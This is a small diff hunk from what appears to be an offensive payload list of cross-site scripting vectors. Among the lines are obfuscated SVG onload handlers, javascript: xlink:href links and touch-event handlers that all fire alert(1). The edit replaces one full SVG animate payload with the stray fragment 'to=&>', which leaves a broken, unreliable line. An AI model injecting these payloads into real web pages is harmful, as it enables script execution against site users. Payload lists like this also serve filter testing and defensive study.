@@ -113,7 +113,7 @@ https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Cross-Site-Script
 <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
 <svg><script xlink:href=data:,alert(1) /> 
 <math><brute xlink:href=javascript:alert(1)>click 
-<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+to=&>
 <html ontouchstart=alert(1)> 
 <html ontouchend=alert(1)> 
 <html ontouchmove=alert(1)> 
